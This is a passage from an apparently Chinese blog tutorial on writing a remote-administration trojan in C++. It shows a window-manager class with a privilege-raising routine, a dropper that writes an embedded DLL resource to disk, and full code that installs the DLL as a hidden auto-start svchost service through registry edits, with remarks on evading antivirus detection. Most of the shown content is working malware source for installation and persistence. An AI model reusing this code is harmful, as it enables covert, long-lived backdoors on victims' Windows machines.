class="comment">//</span></span><br><span class="line"><span class="comment">//////////////////////////////////////////////////////////////////////</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> _MSC_VER &gt; 1000</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> once</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">// _MSC_VER &gt; 1000</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;Manager.h&quot;</span></span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CWindowsManager</span> :</span> <span class="keyword">public</span> CManager</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">public</span>:</span><br><span class="line">		CWindowsManager(CClientSocket* pClient, BYTE bHow);<span class="comment">//bHow是传进来功能的标志</span></span><br><span class="line">		<span class="keyword">virtual</span> ~CWindowsManager();</span><br><span class="line">		<span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">OnReceive</span><span class="params">(LPBYTE lpBuffer, UINT nSize)</span></span>;</span><br><span class="line"></span><br><span class="line">		<span class="function"><span class="keyword">static</span> <span class="keyword">bool</span> <span class="title">DebugPrivilege</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* PName, BOOL bEnable)</span></span>;	<span class="comment">//提权</span></span><br><span class="line">		<span class="function"><span class="keyword">static</span> <span class="keyword">bool</span> CALLBACK <span class="title">EnumWindowsProc</span><span class="params">(HWND hwnd, LPARAM lParam)</span></span>;	<span class="comment">//迭代窗口的回调消息处理函数</span></span><br><span class="line">		<span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">ShutdownWindows</span><span class="params">(DWORD dwReason)</span></span>;	<span class="comment">//强制关闭窗口</span></span><br><span class="line">	<span class="keyword">private</span>:</span><br><span class="line">		BYTE m_caseSystemIs;<span class="comment">//构造函数会初始化这个变量，用于区分进程或者窗口的变量</span></span><br><span class="line"></span><br><span class="line">		<span class="function">LPBYTE <span class="title">getWindowsList</span><span class="params">()</span></span>;	<span class="comment">//获取窗口信息数据</span></span><br><span class="line">		<span class="function"><span class="keyword">void</span> <span class="title">SendWindowsList</span><span class="params">()</span></span>;		<span class="comment">//发送窗口信息数据</span></span><br><span class="line">		<span class="function"><span class="keyword">void</span> <span class="title">SendDialupassList</span><span class="params">()</span></span>;</span><br><span class="line">		<span class="function"><span class="keyword">void</span> <span class="title">ShowTheWindow</span><span class="params">(LPBYTE buf)</span></span>;	<span class="comment">//以某种方式展示窗口</span></span><br><span class="line">		<span class="function"><span class="keyword">void</span> <span class="title">CloseTheWindow</span><span class="params">(LPBYTE buf)</span></span>;	<span class="comment">//关闭窗口</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="数据传输"><a href="#数据传输" class="headerlink" title="数据传输"></a>数据传输</h3><p>和进程管理都差不多，只是数据头发生了变换，就不在详细论述了。</p>
<h2 id="part8-文件管理"><a href="#part8-文件管理" class="headerlink" title="part8-文件管理"></a>part8-文件管理</h2><h2 id="part9-音频管理"><a href="#part9-音频管理" class="headerlink" title="part9-音频管理"></a>part9-音频管理</h2><h2 id="part10-摄像头视频管理"><a href="#part10-摄像头视频管理" class="headerlink" title="part10-摄像头视频管理"></a>part10-摄像头视频管理</h2><h2 id="part11-服务管理"><a href="#part11-服务管理" class="headerlink" title="part11-服务管理"></a>part11-服务管理</h2><p>前提需要管理员权限</p>
<h2 id="part12-注册表管理"><a href="#part12-注册表管理" class="headerlink" title="part12-注册表管理"></a>part12-注册表管理</h2><p>前提需要管理员权限</p>
<h2 id="part13-客户端的启动管理"><a href="#part13-客户端的启动管理" class="headerlink" title="part13-客户端的启动管理"></a>part13-客户端的启动管理</h2><h3 id="资源加载"><a href="#资源加载" class="headerlink" title="资源加载"></a>资源加载</h3><p>之前也弄过读取资源的代码，但是一直没成功，现在发现是没有将资源添加进项目的原因。</p>
<p>导入资源，添加资源到项目，然后调用加载资源的那几个函数就ok了。</p>
<p>几个函数</p>
<ul>
<li>FindResource，寻找资源</li>
<li>SizeofResource，获得资源的大小</li>
<li>LoadResource，加载资源数据</li>
<li>LockResource，复制资源到申请的空间。</li>
</ul>
<p>例子，将我们的dll创建到d盘下</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">// Loder.cpp : 此文件包含 &quot;main&quot; 函数。程序执行将在此处开始并结束。</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;resource.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">CreateMyFile</span><span class="params">(<span class="keyword">char</span>* strFilePath, LPBYTE lpBuffer, DWORD dwSize)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	DWORD dwWritten;</span><br><span class="line"></span><br><span class="line">	HANDLE hFile = CreateFile(strFilePath, GENERIC_WRITE, <span class="number">0</span>, <span class="literal">NULL</span>, CREATE_ALWAYS, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">	<span class="keyword">if</span> (hFile != <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		WriteFile(hFile, (LPCVOID)lpBuffer, dwSize, &amp;dwWritten, <span class="literal">NULL</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	CloseHandle(hFile);</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//要释放的路径   资源ID            资源名</span></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">CreateEXE</span><span class="params">(<span class="keyword">char</span>* strFilePath, <span class="keyword">int</span> nResourceID, <span class="keyword">char</span>* strResourceName)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	HRSRC hResInfo;</span><br><span class="line">	HGLOBAL hResData;</span><br><span class="line">	DWORD dwSize;</span><br><span class="line">	LPBYTE p;</span><br><span class="line">	<span class="comment">// 查找所需的资源</span></span><br><span class="line">	hResInfo = FindResource(<span class="literal">NULL</span>, MAKEINTRESOURCE(nResourceID), strResourceName);</span><br><span class="line">	<span class="keyword">if</span> (hResInfo == <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">//MessageBox(NULL, &quot;查找资源失败！&quot;, &quot;错误&quot;, MB_OK | MB_ICONINFORMATION);</span></span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// 获得资源尺寸</span></span><br><span class="line">	dwSize = SizeofResource(<span class="literal">NULL</span>, hResInfo);</span><br><span class="line">	<span class="comment">// 装载资源</span></span><br><span class="line">	hResData = LoadResource(<span class="literal">NULL</span>, hResInfo);</span><br><span class="line">	<span class="keyword">if</span> (hResData == <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">//MessageBox(NULL, &quot;装载资源失败！&quot;, &quot;错误&quot;, MB_OK | MB_ICONINFORMATION);</span></span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// 为数据分配空间</span></span><br><span class="line">	p = (LPBYTE)GlobalAlloc(GPTR, dwSize);</span><br><span class="line">	<span class="keyword">if</span> (p == <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">//MessageBox(NULL, &quot;分配内存失败！&quot;, &quot;错误&quot;, MB_OK | MB_ICONINFORMATION);</span></span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// 复制资源数据</span></span><br><span class="line">	CopyMemory((LPVOID)p, (LPCVOID)LockResource(hResData), dwSize);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">bool</span> bRet = CreateMyFile(strFilePath, p, dwSize);</span><br><span class="line">	<span class="keyword">if</span> (!bRet)</span><br><span class="line">	&#123;</span><br><span class="line">		GlobalFree((HGLOBAL)p);</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	GlobalFree((HGLOBAL)p);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">	CreateEXE((<span class="keyword">char</span> *)<span class="string">&quot;D:\\123.dll&quot;</span>, IDR_DLL, (<span class="keyword">char</span>*)<span class="string">&quot;DLL&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="添加服务"><a href="#添加服务" class="headerlink" title="添加服务"></a>添加服务</h3><p>无论是《逆向工程核心原理》还是《黑客编程》里面都有如何添加服务的例子，需要用到的函数。</p>
<pre><code>SC_HANDLE WINAPI OpenSCManager(         //建立一个连接到服务控制管理器，并打开指定的数据库。
__in          LPCTSTR lpMachineName,         //指向零终止字符串，命名为目标计算机。
__in          LPCTSTR lpDatabaseName,       //指向零终止字符串，名称的服务控制管理数据库，以开放。
__in          DWORD dwDesiredAccess        //指定服务的访问控制管理。
);

SC_HANDLE WINAPI CreateService(         //创建一个服务对象并且把它加入到服务管理数据库中
         SC_HANDLE hSCManager, //服务控制管理程序维护的登记数据库的句柄，由系统函数OpenSCManager 返回 　　**
         LPCTSTR lpServiceName, //以NULL 结尾的服务名，用于创建登记数据库中的关键字 　　                  **
         LPCTSTR lpDisplayName, //以NULL 结尾的服务名，用于用户界面标识服务 　　                          **
         DWORD dwDesiredAccess, //指定服务返回类型 　　
         DWORD dwServiceType, //指定服务类型 　　
         DWORD dwStartType, //指定何时启动服务 　　
         DWORD dwErrorControl, //指定服务启动失败的严重程度 　　
         LPCTSTR lpBinaryPathName, //指定服务程序二进制文件的路径 　　                                    **
         LPCTSTR lpLoadOrderGroup, //指定顺序装入的服务组名 　　
         LPDWORD lpdwTagId, //忽略，NULL 　　
         LPCTSTR lpDependencies, //指定启动该服务前必须先启动的服务或服务组 　　
         LPCTSTR lpServiceStartName, //以NULL 结尾的字符串，指定服务帐号。如是NULL,则表示使用LocalSystem 帐号 　　
         LPCTSTR lpPassword //以NULL 结尾的字符串，指定对应的口令。为NULL表示无口令。但使用LocalSystem时填NULL 
);

BOOL WINAPI CloseServiceHandle(             //关闭服务器管理器
  __in          SC_HANDLE hSCObject          服务器句柄
);</code></pre>
<p>这就是创建一个服务的基本过程。</p>
<p>接下来就是如何利用SVCHOST.exe启动服务，来达到一个长期驻留的过程，其方法就是修改注册表。</p>
<p>找到HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Svchost，打开子健项netsvcs，遍历数据，返回一个未有的服务名称，并添加。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">char</span>* <span class="title">AddsvchostService</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">char</span>* lpServiceName = <span class="literal">NULL</span>;</span><br><span class="line">	<span class="keyword">int</span> rc = <span class="number">0</span>;</span><br><span class="line">	HKEY hkRoot;</span><br><span class="line">	<span class="keyword">char</span> buff[<span class="number">2048</span>];</span><br><span class="line">	<span class="comment">//打开装所有svchost服务名的注册表键</span></span><br><span class="line">	<span class="comment">//query svchost setting</span></span><br><span class="line">	<span class="keyword">char</span>* ptr;</span><br><span class="line">	<span class="keyword">char</span> pSvchost[] = <span class="string">&quot;SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Svchost&quot;</span>;</span><br><span class="line">	rc = RegOpenKeyEx(HKEY_LOCAL_MACHINE, pSvchost, <span class="number">0</span>, KEY_ALL_ACCESS, &amp;hkRoot);</span><br><span class="line">	<span class="keyword">if</span> (ERROR_SUCCESS != rc)</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">	DWORD type, size = <span class="keyword">sizeof</span> buff;</span><br><span class="line">	<span class="comment">//枚举他所有的服务名</span></span><br><span class="line">	rc = RegQueryValueEx(hkRoot, <span class="string">&quot;netsvcs&quot;</span>, <span class="number">0</span>, &amp;type, (<span class="keyword">unsigned</span> <span class="keyword">char</span>*)buff, &amp;size);</span><br><span class="line">	SetLastError(rc);</span><br><span class="line">	<span class="keyword">if</span> (ERROR_SUCCESS != rc)</span><br><span class="line">		RegCloseKey(hkRoot);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">bool</span> bExist = <span class="literal">false</span>;</span><br><span class="line">	<span class="keyword">char</span> servicename[<span class="number">50</span>];</span><br><span class="line">	<span class="keyword">do</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">//这里获得类似这样的服务名netsvcs_0，netsvcs_1</span></span><br><span class="line">		wsprintf(servicename, <span class="string">&quot;netsvcs_0x%d&quot;</span>, i);</span><br><span class="line">		<span class="keyword">for</span> (ptr = buff; *ptr; ptr = <span class="built_in">strchr</span>(ptr, <span class="number">0</span>) + <span class="number">1</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="comment">//然后比对一下服务名中是否有这个名字了</span></span><br><span class="line">			<span class="keyword">if</span> (lstrcmpi(ptr, servicename) == <span class="number">0</span>)</span><br><span class="line">			&#123;</span><br><span class="line">				bExist = <span class="literal">true</span>;</span><br><span class="line">				<span class="keyword">break</span>;              <span class="comment">//如果没有就跳出</span></span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> (bExist == <span class="literal">false</span>)</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		bExist = <span class="literal">false</span>;</span><br><span class="line">		i++;</span><br><span class="line">	&#125; <span class="keyword">while</span> (<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">	servicename[lstrlen(servicename) + <span class="number">1</span>] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">	<span class="comment">//然后将这个服务名写到所有服务名的后面，</span></span><br><span class="line">	<span class="comment">//不要妄想，直接用api在一个注册表的键值后面添加一些信息</span></span><br><span class="line">	<span class="built_in">memcpy</span>(buff + size - <span class="number">1</span>, servicename, lstrlen(servicename) + <span class="number">2</span>);</span><br><span class="line">	<span class="comment">//然后将含有新服务名的缓冲区写入注册表，注册表里原有内容被覆盖</span></span><br><span class="line">	rc = RegSetValueEx(hkRoot, <span class="string">&quot;netsvcs&quot;</span>, <span class="number">0</span>, REG_MULTI_SZ, (<span class="keyword">unsigned</span> <span class="keyword">char</span>*)buff, size + lstrlen(servicename) + <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">	RegCloseKey(hkRoot);</span><br><span class="line"></span><br><span class="line">	SetLastError(rc);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (bExist == <span class="literal">false</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		lpServiceName = <span class="keyword">new</span> <span class="keyword">char</span>[lstrlen(servicename) + <span class="number">1</span>];</span><br><span class="line">		lstrcpy(lpServiceName, servicename);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//回到 InstallService</span></span><br><span class="line">	<span class="keyword">return</span> lpServiceName;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>上面的代码会出错，就是我们读取不到netsvcs子健项的值，原因是因为我们的操作系统是windows64位的，发生了注册表重定位，所以需要加上KEY_WOW64_64KEY。</p>
<pre><code>rc = RegOpenKeyEx(HKEY_LOCAL_MACHINE, pSvchost, 0, KEY_ALL_ACCESS| KEY_WOW64_64KEY, &amp;hkRoot);</code></pre>
<p>然后就是向子健HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services，添加一个我们的服务的子健了，包含了服务的基本信息，服务名，服务描述，程序路径。然后继续在下面添加子健Parameters，新建子健项ServiceDll，写入dll的全路径。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">ServerSetup</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">char</span> lpServiceDescription[] = <span class="string">&quot;The_Itach1服务&quot;</span>;</span><br><span class="line">	<span class="keyword">char</span> strModulePath[MAX_PATH];</span><br><span class="line">	<span class="keyword">char</span>	strSysDir[MAX_PATH];</span><br><span class="line">	<span class="keyword">char</span> strSubKey[<span class="number">1024</span>];</span><br><span class="line">	DWORD	dwStartType = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">char</span>	strRegKey[<span class="number">1024</span>];</span><br><span class="line">	<span class="keyword">int</span> rc = <span class="number">0</span>;</span><br><span class="line">	HKEY hkRoot = HKEY_LOCAL_MACHINE, hkParam = <span class="number">0</span>;</span><br><span class="line">	SC_HANDLE hscm = <span class="literal">NULL</span>, schService = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//打开服务</span></span><br><span class="line">	hscm = OpenSCManager(<span class="literal">NULL</span>, <span class="literal">NULL</span>, SC_MANAGER_ALL_ACCESS);</span><br><span class="line">	GetSystemDirectory(strSysDir, <span class="keyword">sizeof</span>(strSysDir));</span><br><span class="line">	<span class="keyword">char</span> bin[] = <span class="string">&quot;%SystemRoot%\\System32\\svchost.exe -k netsvcs&quot;</span>;</span><br><span class="line">	<span class="keyword">char</span>* lpServiceName = AddsvchostService();                             <span class="comment">//*添加的代码在这个函数中*</span></span><br><span class="line">	<span class="keyword">char</span> lpServiceDisplayName[<span class="number">128</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">	wsprintf(lpServiceDisplayName, <span class="string">&quot;%s_ms,&quot;</span>, lpServiceName);</span><br><span class="line">	<span class="comment">//这里返回新的服务名后就构造服务dll的名字</span></span><br><span class="line">	<span class="built_in">memset</span>(strModulePath, <span class="number">0</span>, <span class="keyword">sizeof</span>(strModulePath));</span><br><span class="line">	wsprintf(strModulePath, <span class="string">&quot;%s\\%sex.dll&quot;</span>, <span class="string">&quot;D:\\&quot;</span>, lpServiceName);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//然后构造服务中的描述信息的位置</span></span><br><span class="line">	wsprintf(strRegKey, <span class="string">&quot;MACHINE\\SYSTEM\\CurrentControlSet\\Services\\%s&quot;</span>, lpServiceName);</span><br><span class="line"></span><br><span class="line">	schService = CreateService(</span><br><span class="line">		hscm,						<span class="comment">// SCManager database</span></span><br><span class="line">		lpServiceName,              <span class="comment">// name of service</span></span><br><span class="line">		lpServiceDisplayName,       <span class="comment">// service name to display</span></span><br><span class="line">		SERVICE_ALL_ACCESS,			<span class="comment">// desired access</span></span><br><span class="line">		SERVICE_WIN32_OWN_PROCESS,</span><br><span class="line">		SERVICE_AUTO_START,			<span class="comment">// start type</span></span><br><span class="line">		SERVICE_ERROR_NORMAL,		<span class="comment">// error control type</span></span><br><span class="line">		bin,						<span class="comment">// service&#x27;s binary</span></span><br><span class="line">		<span class="literal">NULL</span>,						<span class="comment">// no load ordering group</span></span><br><span class="line">		<span class="literal">NULL</span>,						<span class="comment">// no tag identifier</span></span><br><span class="line">		<span class="literal">NULL</span>,						<span class="comment">// no dependencies</span></span><br><span class="line">		<span class="literal">NULL</span>,						<span class="comment">// LocalSystem account</span></span><br><span class="line">		<span class="literal">NULL</span>);						<span class="comment">// no password</span></span><br><span class="line">	dwStartType = SERVICE_WIN32_OWN_PROCESS;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (schService == <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">throw</span> <span class="string">&quot;CreateService(Parameters)&quot;</span>;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;schServicenull&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	CloseServiceHandle(schService);</span><br><span class="line">	CloseServiceHandle(hscm);</span><br><span class="line"></span><br><span class="line">	hkRoot = HKEY_LOCAL_MACHINE;</span><br><span class="line">	<span class="comment">//这里构造服务的描述键</span></span><br><span class="line">	wsprintf(strSubKey, <span class="string">&quot;SYSTEM\\CurrentControlSet\\Services\\%s&quot;</span>, lpServiceName);</span><br><span class="line">	<span class="keyword">if</span> (dwStartType == SERVICE_WIN32_SHARE_PROCESS)</span><br><span class="line">	&#123;</span><br><span class="line">		DWORD	dwServiceType = <span class="number">0x120</span>;</span><br><span class="line"></span><br><span class="line">		<span class="comment">//写入服务的描述</span></span><br><span class="line">		WriteRegEx(HKEY_LOCAL_MACHINE, strSubKey, <span class="string">&quot;Type&quot;</span>, REG_DWORD, (<span class="keyword">char</span>*)&amp;dwServiceType, <span class="keyword">sizeof</span>(DWORD), <span class="number">0</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//写入服务的描述</span></span><br><span class="line">	WriteRegEx(HKEY_LOCAL_MACHINE, strSubKey, <span class="string">&quot;Description&quot;</span>, REG_SZ, (<span class="keyword">char</span>*)lpServiceDescription, lstrlen(lpServiceDescription), <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">	lstrcat(strSubKey, <span class="string">&quot;\\Parameters&quot;</span>);</span><br><span class="line">	<span class="comment">//写入服务的描述</span></span><br><span class="line">	WriteRegEx(HKEY_LOCAL_MACHINE, strSubKey, <span class="string">&quot;ServiceDll&quot;</span>, REG_EXPAND_SZ, (<span class="keyword">char</span>*)strModulePath, lstrlen(strModulePath), <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (schService != <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		CreateEXE(strModulePath, IDR_DLL, (<span class="keyword">char</span> *)<span class="string">&quot;DLL&quot;</span>);</span><br><span class="line">		StartService(lpServiceName);</span><br><span class="line">	&#125;</span><br><span class="line">	RegCloseKey(hkRoot);</span><br><span class="line">	RegCloseKey(hkParam);</span><br><span class="line">	CloseServiceHandle(schService);</span><br><span class="line">	CloseServiceHandle(hscm);</span><br><span class="line">	system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后就完成了，但是很遗憾，免杀肯定是过不了的，首先，修改HKEY_LOCAL_MACHINE的注册表，需要管理员权限，其次，修改注册表的过程肯定会被各种杀毒软件检测，包括代码中有将dll保存在c盘下的操作，现在肯定是不行了，管理员权限都不能随便修改c盘下的文件，其次文件一旦保存到磁盘中，肯定是会被杀毒软件检测出来。</p>
<h3 id="修改DLL，测试上线"><a href="#修改DLL，测试上线" class="headerlink" title="修改DLL，测试上线"></a>修改DLL，测试上线</h3><p>一般服务进程和我们普通exe不一样，需要有一个特殊的main函数入口，实际上就是一套代码，网上也有很多。</p>
<p>记得删除原本的dllmain函数</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span 